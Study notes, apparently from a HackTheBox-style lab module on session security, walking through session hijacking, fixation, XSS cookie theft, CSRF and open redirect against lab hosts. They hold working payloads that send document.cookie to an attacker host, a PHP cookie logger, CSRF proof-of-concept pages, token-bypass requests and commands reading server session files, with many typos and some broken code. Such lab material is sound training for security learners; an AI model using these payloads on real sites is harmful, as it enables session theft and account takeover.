# Session Security:

## Session Hijacking:
An attacker can obtain a victim's session identifier using a several methods, with the most begin:
- Passive Traffic Sniffing : Monitoring unencrypted network traffic to intercept session tokens.
- XSS: using malicius scripts to steal session data form the victim.
- Browser History or Log-Diving: Extracting session Info from browser caches or apps logs.
- Db Access: Gaining unauthorized access to database storing session identifier.


- Session Hijacking Example:
Proceed to the end of this session and click on [click here to spaw the target system] use the previus PWN or a local VM with th supplied VPN key to reach
the target application and follow along. Don't forget to configure the specified vhost [xss.htb.net] to access the application.
A quick way to specify this vhost in ur attacking system below:
` printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts`

- Part 1: identifier the session identifier
Navigate to the [http://xss.htb.net] and log in the aoo using the credentias below:
    - Mail heavycat106
    - Pass: rockmrol

This is the account that we create to look the app, using the web developer tool notice that the app is using a cookie named auth-session.

- Part 2 - Simulate an attacker:

Open a private windows and navigate to http://xss.htb.net, replace the current auth-session cookie value with the one u copie.

___

## Session Fixation:

This occurs when an attacker can fixate a valid session identifier, the attacker will then have to trick the victim into logging into the app using the aforementioned using the
session identifier. Such bugs usually occurs when session identifiers are begin accepted form URL QUERY STRINGS or Post Date.

- Stage 1: Attacker manage to obtain a valid session identifier:
authentication to an app os not always a requiremet to get a valid session identifier, and larger number of apps assign valid session identifiers to anyone who browsers them.
This is also means that an attacker can be assigned a valid session identifier without having to authentication.

- Stage 2: Attackers maneges to fixate a valid identifier:
The above is expected behavior, but it can into a session fixation vulnearabiliy if:
    - The assigned session identifier pre-login remains the same post login and.
    - Session identifier are begin accepted from URL query Strings or POST data propagated.

- Stage 3: Attacker tricks the victim into establishing a session using the abovementioned session identifier.
All attacker has to do is craft a URL and lure the victim into visiting it, the web app will then assign the session identifier.

- Session Fixation Example:
Proceed  to the end og this section and click on [Click here to spawn the target system] or the [Reset Target], use the provided pwd or a local VM with the supplied VPN key to reach
the target app and follow along. Don't forget to configure the specified vhost [oredirect.htb.net] to access the app.
    - Part 1 : Search fixation identification
    Navigate to oredirect.htb.net.[http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN VALUE>], using web tool for notice that the app uses a session cookie named PHPSESSION and that
    the cookie value os the same as the [token] parameter's VALUE.
    If any value or a valid session identifier specified in the token parameter on the URL os propagated to the PHPSESSION fixation.

    - Part 2: Session fixation explotation attempt:
    New Private Windows and navigate to [http://oredirect.htb.net/?redirect_uri=/complete.html&token=IControlThisCookie] notice that th PHPSESSID cookie value is IControlThisCookie.

> [!NOTE]  Another way of identifying this is via blindly putting the session identifier name and value in the URL and then refreshing.

Suppose we are looking into [http://insecure.exampleapp.com/login] for session fixation, and the session identifier begin used is a cookie named PHPSESSID. To test for session we try the following
[http://insecure.exampleapp.com/login?PHPSESSION=AttackerSpecifiedCookieValue] and see if the specified cookie value is propagated to the app.

CODE:
```php
<?php
    if (!isset($_GET["token"])) {
        session_start();
    } else {
        setcookie("PHPSESSID", $_GET["token"]);
    }
?>

```

Break the CODE:
```php
    if (!isset($_GET["token"])) {
        session_start();

```
This piece of code can be traslate as; if the token parameter hasn't been defined, start the session
`header("Location: /?redirect_uri=/complete.html&token=" . session_id());`

The above piece of code redirect the user to the url and then call the session_id funtion  to append session_id onton the token value.
```php
} else {
        setcookie("PHPSESSID", $_GET["token"]);
    }
?>
```
The last part can traslate; if the token parameter is already set set PHPSESSION to the value of the token parameter. Any URL in the following format.

- Exercise:
 If the HttpOnly flag was set, would the application still be vulnerable to session fixation? Answer Format: Yes or No
- YES

___

## Obtaining Session Identifier Without User inteneration:

There are multiple attacking tech through which a bug bounty or penetration testes can obtain session identifier. These tech can be split into two categories:
1. Session ID-obtaining attacks without user inteneration.
2. Session ID-obtaining attacks requiring user interation.

- Obtaining Session Identifier via Traffic Sniffing:

Traffic Sniffing is something that most penetration tester do when assessing a network's Security from the inside. U'll usually see them plugging their laptops or Raspeberry
Pis into avaliable ethernet sockets. Doing so allows monitor the traffic and gives them an idead of the taffic going through the network and the services they may attack.
Traffic Sniffing requieres the attacker and the victim to be on the same local network. Then and only then can HTTP Traffic be inspected by the attackers. You may
have noticed that we metioned HTTP traffic, this is cause HTTP is a protocol that tranfer data unencrypted. Thus if an attacker is monitoring the network, they can catch all
kinds of information such a username, pass, and even session identifier. This type of information wull be more challeging and, most of time, impossible to obtain of HTTP is
encrypted through SSL or IPsec.

For traffic Sniffing Requiered:
1. The attacker must be be positioned on the same local netwok as the victim.
2. Unencrypted HTTP traffic.


There are numerous packet Sniffing tools, will use [Wireshark], has inbuilt filter funtion that allow users to filter traffic for a specifiv protocol as HTTP, SSH, FTP and even for a
particular source IP addr.

- Part 1 Simulate the attacker:
Navigate to http://xss.htb.net using the Web developer tool and notice the app uses a cookie named [auth-session]
Now we can use Wireshark:
`sudo -E Wireshark`
click and tun0

- Part 2: Simulate the victim
Navigate to [http://xss.htb.net] through a New Private Windows and login to the app using the credentials below:
    - Mail: heavycat106
    - Pass: rockmrol
- Part 3: Obtain the victim's cookie through packet analysis.
Inside Wireshark, apply filter to see HTTP traffic, this can be done as follow, Now search within the Packet bytes for any auth-session cookie as follows.
Navigate to [Edit -> Find Packet], Left-click on Packet List and then click Packet bytes.
Select String ant the third drop-down menu and specify auth-session on the field next to it. Wireshark will present u with the packets that include and auth-session.
The cookie can be copied by right-clicking on a row that cotain it, then clicking on Copy and finally clicking value.

- Part 4 Hijacking the victim's session:
Back to the Browser windows using which u first browsed the app, open Web Dev tools navigate to storage, and change ur current cookie's value to the one u obtained through Wireshark.

### Obataining Session Identifier Post-Explotation (Web Server Access)
> [!NOTE] The below example cannot be replicated in this section's lab.

During the Post-Explotation phase, session identifier and session data can be reitrived from either a web server disk or memory. An attacker who has compromised a web server can do more than
obtain data and session identifier.
An attacker may not want to continue issuing command the increase the chance of getting caught.

- PHP
The entry [session.save_path in PHP.ini}] specifies where session data will be stored.

```sh
locate php.ini
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'

```
Def configuration case it's /var/lib/php/sessions. The files an attacker will search for use the name convention [sess_<sessionID>]
The same PHP session identifier the webserver side looks as follow.
```sh
ls /var/lib/php/sessions
cat //var/lib/php/session/sess_...
```

As already mentioned, a new cookie must be created in the web browser with following values:
cookie name : PHPSESSID
cookie value: ....

- JAVA
According to the apache Sofware Foundation:
The manager element represent the session manager that is used to create and maintain HTTP session of Web app.
Tomcat provides two standard implementations of Manager. The def implementation stores active session, while the optional one stores active sessions
that have been swapped out in a storage location that is selected via the use of an appropiate Store nested element. The filename of the def session data file is Session.ser

- NET
Session Data can be found in:
    - The app worker process [aspnet_wp.exea] - This is the case in the InProc Session mode
    - StateServer - This is the case in the OutProc Session mode.
    - An SQL Server.
[Intro to ASP.MET Session](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/)

### Obtaining Session Identifier Post-Explotation(Data-base):

Where u have direct access to a database via, SQL injection or identified credentials, u should always check for any stored user session.

```sql
show databases;
use project;
show tables;
select * from users;
```

Here we can se the user's pass are hashed. We could spend time trying to crack these; there is also a "all_sessions" table. Let us extract data from the table.
```sql
select * from all_sessions;
select * from all_sessions where id=3
```
Here we successfully extracted the sessions now we auth as the user dev, we cover Session ID-obtaining attacks requiring user interaction.
    - XSS  -> with a focus on user session.
    - CSRF
    - Open Redirect --> With a focus on user session.

Exercise -  If xss.htb.net was an intranet application, would an attacker still be able to capture cookies via sniffing traffic if he/she got access to the company's VPN? Suppose that any user connected to the VPN can interact with xss.htb.net. Answer format: Yes or No
YES

___

## Cross-Site scripting [XSS]
This vulnearability are among the most common web vulnearability, and XSS vulnerability may aloow an attacker to execute arbitrary JS code within the target's browser and result in complete web app compromise of chained together session with other vulnerability.
If u want to dive deeper into Cross-Site vulnerabilities we suggest u study or XSS module.
> [!IMPORTANT]
> Requirements:
> 1. Session cookie should be carried in all HTML request.
> 2. Session cookie should be accessible by JS code.

Exercise practise:
Email: crazygorilla983
Password: pisces

It's best to use a payload with event handler like [onload or onerror] since they fire up automatically and also prove the highest impact on stored XSS cases.
```js
"><img src=x onerror=prompt(document.domain)"
```

We are using [document.domain] to ensure that JS is begin executed on the actual domain and not in a sandboxed enviromnet. JS begin executed in a sandboxed enviroment
prevents client-side attacks. It should be noted that sandbox escape exist but are outside the scope.
In the remaing two fields, let us specify the following two payloads

> [!CODE] Payloads
> "><img src=x onerror=confirm(1)>
> "><img src=x oneerror=alert(1)"

The submit with save, the profile was uploaded successfully, we notice no paylaod begin triggered, the payload code is not going to be called/executed until another app
functionality triggers.
Share as it's only other functionality we have, to see if any of the submitted payloads are reitrived in there.
This functionality returns a publicly accesible profile, stored XSS in the functionality would be ideal from attacker's perpective.
We must to check if is the HTTPOnly is off --> false.

### Obtaining Session Cookie through XSS:
Let us create a cookie-logging script (save it as log.php) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The below PHP script can be hosted on a VPS or your attacking machine (depending on egress restrictions).
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie, "\n\n");
fclose($handle);

header("Location: http://www.google.com");
exit;
?>

```

This script waist for anyone to request [?c=+documnet.cookie], then parse the include cookie.
The cookie-logging script can be run as follow, [TUN Adapter IP] is the [tun] interface's IP of either Pwdbox or ur VM.
`php -S TUN Adapter Ip:8000`
Before we simulatee the attacks, let us restore Ela Stiener original mail and Telephone. Let us place the below payload on the Country Field. There are no specific requierement for the payload, we just used a less common and a bit more advanced one since
u may be requiered to do the same for evasion purpouses.

> [!CODE] Payload
> `<style>@keyframe x{}</><video style="animation-name:x" oneanimationed="window.location = http://VPN-TUN-ADAPTER:8000/login.php?c=' + document.cookie;></video>`.

> [!NOTE]
> Of ur doing test in the real world, try to using something like [XXHunter, Burp Collaborator or Project Interactsh].
> Links :
> [XXHunter](https://xsshunter.com/#/)
> [Project Interatch](https://app.interactsh.com/#/)

A sample HTTPS>HTTPS payload example can be found:
`<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(documene.cookie)}">`)'>test</h1>`

- Simulate the Victim:
Email: smallfrog576
Password: guitars

Navigate to [http://xss.htb.net/profile?email=ela.stienen@example.com.], this is the attacker-crafted public profile that hosts our cookie-stealing payload.
Terminate the PHP server with Control+c and the victim cookie  will reside inside [cookieLog.txt].

### Obtaining Session Cookie via XSS (Netcat Edition):
Before we simulate the attack, let us place the below payload in the Country Filed of ELa Stienen and click save. There are no specific requierement for the payload. We just used a less common and a bit more advanced one since u may
be requied for payload.

`nc -nlvp 8000`

Open a New Private Window and navigate to http://xss.htb.net/profile?email=ela.stienen@example.com, simulating what the victim would do.
We don't necessarily have to use the [winddow.location()] object that cause victims to get redirected. We can use [fetch()], which can fetch data cookie and send
it oir server without any redirects.
`<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>`

Exercise -  If xss.htb.net was utilizing SSL encryption, would an attacker still be able to capture cookies through XSS? Answer format: Yes or No
YES

___

## Cross-Site Forgery [CSRF or XSRF]

Cross-site resquest are common in web app and are used for multiple legitimate purpouses.
CSRF or XSRF is an attack that forces and end-user to execute inadvertent on a web app on wthch they are currently authentication. This attack is usually mounted with help of attacker-crafted web pages that the victim must visit or interact with, leveraing
the lack of anti-CSRF securioty mechanism. These web pages contain malicius request that essentially inherit the identitity and privilege of the victim to perform an undersired funtion on the victim's behalf.
A sussucessful CSRF attack can compromise end-user and operations when it targets a regular use, If the targeted end-user is and admin, one a CSRF attack can compromise the entire web app.

During the CSRF attacks, the attacker does not need to read the server's response to the malicius cross-site request. This means that [Same-Origin Policy] cannot be considered a security mechanism against CSRF attacks.

> [!IMPORTANT] According to Mozilla, the Same-Origin Policy is a critical mechanims that restictes how document or script loaded by one origin can interact with a resource from another origin.
> The Same-Origin policy will not allow an attacker to read the server's response to a malicius cross-site request.

A web app is vulnerable to CSRF attacks when:
1. All paramerters required for the targeted request can be determine or guessed by the attacker.
2. The app session managment is solely based on HTTP cookie, which are automatically included in browser request.

To sussucessfuly exploit a CSRF vulnerability, we need:
1. To craft a malicius web pages that will issue a valid [cross-site] request impresonating the victim.
2. The victim to be logged into the app at the time when the malicius cross-site request is issued.

- Cross-site request Forgery Example;
Email: crazygorilla983
Password: pisces
Run Burpsuite and activate the proxy, we notice no anti-CSRF token int the update-profile request. Try executing a CSRF attack against our account that will change her profile details by simply visiting
another web.

```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>

```

We can serve the page above form our attack machine.
No need for a proxy at this time, so don't make ur browser go though Burpsuite. Restore the Original proxy setting. While still logged in as, open a new tab anf u servering form ur attacing machine
[http://VPN/TUN adapter:Port/notmalicius.html]

___

### Cross-site Request Forgery (Get-based)
Similar to how can we extract session cookies from apps that do not utilize SSL encryption, we can do CSRF Tokens included in unencrypted request.
Example:
Activate the burp on proxy and configure ur browser to go though it, click save.

The CSRF token is icluded in the Get request, simulate on the local that sniffed the abovementioned requested and wants to deface Julei Rogers profile through a CSRF attacks. They could have just performed a session Hijacking attack using the sniffed
session cookie.

CrSimilareate adn serve the below HTLM page and save as notmalicius_get.html.

```HTML
<html>
    <body>
        <form id= "submitME" action="http://....." method="GET">
            <input type="hidden" name="email" value="attacker@mail.com"/>
            <input type="hidden" name="telephone" value=""/>
            <input type="hidden" name="country" value="Cert"/>
            <input type="hidden" name="actione value="save"/>
            <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" /> <!--Sniffing value of the token-->
            <input type="submit" value="Submit request"/>

        <script>
            document.getElement("submitME")
        </script>
    </body>
</html>

```

Notice that the CSRF token's value above is the same as the CSRF token's value in the capture /"sniffed" request.
Wondering [Sending form data](https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Sending_and_retrieving_form_data)
Now we up the server `python -m http.serve 80`
While Still logged, open a new tav and visit the page u're seeving from ur attackng machine  [http://IP:port.notmalicius_get].
___

## Cross-Site Request Forgery Post-Based

The vast of app nowdays perform actions through POST request. CSRF tokens will reside in POST data. Let us attack and app and try to find a way to leak the CSRF token that we can mount
a CSRF attack.
Example to attack:
After the autnentication as a user, u'll notice that u can delete ur account. Let us see how one could steal the user's  CSRF-Token by exploting
an HTML injection/XSS vulnerability.

U can redirect to [app/delete/mail], notice that the email is reflected on the page, try to input the HTML into the mail value, like[<h1>h1<u>underline<%2fu><%2hi>]
If u inspecto on the code u will notice that our injection happens before a single quote. We can abuse this to leak  the CSRF-Token.
Use netcat for intercept the request and now we can CSRF-Token via sending the payload:
[<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f]

While still logged in open the tab [ http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f]
Since tha attack was sussucessful against our test account, we can do the same against any account of our choosing.

We remind u that this attack does not require the attacker to the attacker to reside in the local netwok. HTML injection is used to leak the victim's CSRF
token remotoly.

___

## XXS & CSRF Changing:

Sometimes, even if we manage to bypass CSRF protections, we may not be able to create the cross-site requests due to some sort of same origin/ same site restriction.
WE can try changing vulnerabilities to get the end result of CSRF.

Login with the credentils, some facts about the app:
- The app ft same origin/same site protections as anti-CSRF measure.
- The apps Country field os vulnerable to stored XSS attacks.

Malicius cross-site requests are out of the equation due to the same origin/same site protection, we can still perform a CSRF attack through the stored XSS vulnetability
that exists. We'll leverage the store of XSS vulnerability to issue a state-changing requests against the web app.
A request though XSS will bypass any same origin/same site protection since it will dirive from the same control.

Let us target the Change Visibility request cause a susccessful CSRF Attack targeting Change Visibility can cause the disclousure of a private profile.
Firs star Burp.
You should see the below inside Burp Suite's Proxy;
Lest us focus on the payload we should specify in the Country Field to profile to susccessfully execute a CSRF Attack that will change the victim's visibility settings.
The payload we should specify can be seen below:
```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>

```
First we put the entire scipt in <script> tags, so it gets execute as valid JS and will redered as text.

```js
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
```

This script snipped above creates an ObjectVariable called req, which we will we be using to generate a request.var req = new XMLHttpRequest();
is allowing us to get ready to send HTTP request:

`req.onload = handleResponse`

We see the onload event handler, which will perform an action once the page has been loaded. THis action related to the handleResponse funtion that we will define later.

`req.open('get', '/app/change-visibility', true)`

We pass three arguments .get which is the request method, the targeted path [/app/change-visibility] and then true which continuin execution.

`req.send();`

This part will send everyting we constructed in the HTTP request.
```js
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};

```

Snipped funtion callded handleResponse.

`var token = this.reponseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];`

Snippet above the defines a variable called token, which gets the value of responseTEXT from the page we specified earlier in our request, the funtion looks for a hidden
input field callled csrf and w+ matches one or more alphanumerics chatacters. This may be different, so let us look at how can
identify the name of a hidden value or check if it is actually "CSRF".

Open the dev tool and navigate to the Inspector tab, we can use the search funtionality to look for a specifiv string.

> [!NOTE]  NOTE
If no result is returned and u are certain that CSRF token are in place, look through bits of the source code or copy
> ur current CSRF token and look for through the search funtionality. U may uncover the input field name u are looking for.

```js
var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
```

The script snipped above contructs the HTTP request that we will send though a [XMLHttpRequest](https://blog.0daylabs.com/2014/09/13/ajax-everything-you-should-know-about-xmlhttprequest/)

`changeReq.open('post','/app/change-visibility', true)`

We change the method form GET to POST, the first request was to move us to the targeted page an the second request is perform the wanted action.

`changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')`;

The scipt snipped above is setting the Content-Type to application/x-www-form-urlencoded.

`changeReq.send('csrf='+token+'&action=change');`

This sends the request with one param called csrf having the value of the token variable, which is essentially the vitim's CSRF token, and another parameter
called action with the value change.

Navigate to the windows private and go and use the credentials:
[Email: goldenpeacock467
Password: topcat]
Open a new tab and browse pub profile by navigate to the linK:
[http://minilab.htb.net/profile?email=ela.stienen@example.com]
Now if u go back to the vitim's usual profile page and reload u see that his profile became public.

Ur execute a CSRF attack, bypassing the same origin/same site protections

- Extra practice: Adapt the XSS payload above to delete @goldenpeacock467's account through CSRF.

___

## Exploiting Weak CSRF Tokens:
Web app do not employ very secure or robust token generation algorithms. Like the md5, Lest see the Exmaple:

Credentials:
Mail: goldenpeacock467
Password : topcat

Open Web Tool and focus on the New tab, back to the user's profile and press change visibility and then Make Public.
Now we see the application the cookie md5 and with the terminal change the [echo -n goldenpeacock467 | md3sum]

When accession how robust a CSRF token generation mechanims is make sure for spend a small amount of time trying to come up
with the CSRF token generation mechanims.
Find below the malicius page. It as press_start_2_win.html.
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`$http://csrf.htb.net/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>
```

Svae the md5.min.js and place it in the dir where the malicius page reside.
`!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
//# sourceMappingURL=md5.min.js.map`
Now we can upload the serberand JS  code above from ur attacking machine

This code is part of is a simply code in JS for the md5 algorithms, but optimizade ot be as small as possible.

___


## Additional CSRF Protection Bypasess:
Even Thoug diving deeper into CSRF protection bypassess, find below some approches that may prove helpful during the engagements or bounty hunting.

- NULL Value:
Setting the CSRF token a null value Example
    - CSRF-Token:
    This may work cause sometimes, the check is only looking the header, and it does not validate the token value. We can caft our cross-site request using a null CSRF
    token, as long as the header is provide in the request.

    - Random CSRF Token:

    Setting the CSRF Token valu the same length as the original CSRF token but with a different/random value may also bypass some anti-CSRF
    protection that validate if the token has  a value and the length of the value.

    - Real:
    [CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331]

    - Fake
    [CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3]

- Use another Session'S CSRF Token:
Another anti-CSRF protection bypass is using the same CSRF token across acc. This may work in app that do not validate if the CSRF token is tied
to specifiv account or not and only check if the token algorithmcally correct.
Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331.
Log into the second account and change the value of CSRF-Token to [ 9cfffd9e8e78bd68975e295d1b3d3331] while issuing the same request.

- Resquest Method Tampering:
```html
POST /change_password
POST body:
new_password=pwned&confirm_new=pwned

GET /change_password?new_password&confirm_new=pwned
```

- Delete The CSRF-Token parameter or send a blank token:
Not sending a token works fairly often cause of the following common app logic mistake.
    - Real request:
    ```html
    POST /change_password
    POST body:
    new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
    ```
    - Try
    ```http
    POST /change_password
    POST body:
    new_password=qwerty
    ```
    - Or:
    ```html
    POST /change_password
    POST body:
    new_password=qwerty&csrf_token=
    ```

## Session FIxation > CSRF:
Sites use something called a double submit cookie as a defense against CSRF. This means that the sent request will contain the sa, random token  both as cookie
and as request parameter, and server checks if the two values are equal.
If double-submit cookie is used as the defense mechanims, the app os probably not keeping the valid token on the server-side. It has no way of knowing
of any token it recives is legitimate and merely checks that the token in the cookie and the token.

1. Session fixation
2. Execute CSRF with following request:

```http
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```

- anti-CSRF Protection via the Referrer Header:
If an app is using the referrer header as an anti-CSRF mechanims. Add the following the meta tag to ur page hosting ur CSRF script.

[<meta name="referrer" content="no-referrer">]

- Bypass The Regex:
Let us suppose that the Referrer Header is checking for google.com. We could try something like www.google.com.pwned.m3, which may bypass the regex! If it uses its own domain (target.com) as a whitelist,
try using the target domain as follows www.target.com.pwned.m3.


[www.pwned.m3?www.target.com or www.pwned.m3/www.target.com]

___

## Open Redirect:
An Open Redirect vulnerabilitiy occurs when a attacker can redirect a vitim to an attacker-controlled site by abussing a legitimate app redirection funtionlaity. All the attacker
has to do is specify a website under their control on redirection URL of a legitimate website and pass this URL to the victim. This is possible when the legitimate app redirect
funcionality does not perform any kind of validation regarding the web to which th redirection points.
Somw code:
```php
$red = $_GET['url']
header("Location: " . $red);

```
IN the line of code above, a variable called red is defined that gets its value from a parameter calles url.$_GET is a PHP superglobal variable that enables
us to  access the url parameter value.

The location response header indicates the URL to redirect a page to. The line of code above sets the location to the value of red, whitout any validation.
The malicius URL an attacker would send levering the Open redirect vulnerability would look as follow: [trusted.site/index.php?url=https://evil.com]
Make sure check the following URL parameter when bug hounting, often see them in login page.

- ?url=
- ?link=
- ?redirect=
- ?redirecturl=
- ?redirect_uri=
- ?return=
- ?return_to=
- ?returnurl=
- ?goto=
- ?exit=
- ?exitpage=
- ?formurl=
- ?formuri=
- ?redirect_to=
- ?next=
- ?newurl=
- ?redir=


- Open Redirect Example:
Procced to the section to spawn the machine:
Navigate to [oredirect.htb.net], if u enter a mail account u'll notice that the app is eventually making POST request to the page specified in the redirect_url parameter.
A token is also icluded in the POST request, this token could be a session or anti-CSRF token and useful to an attacker.

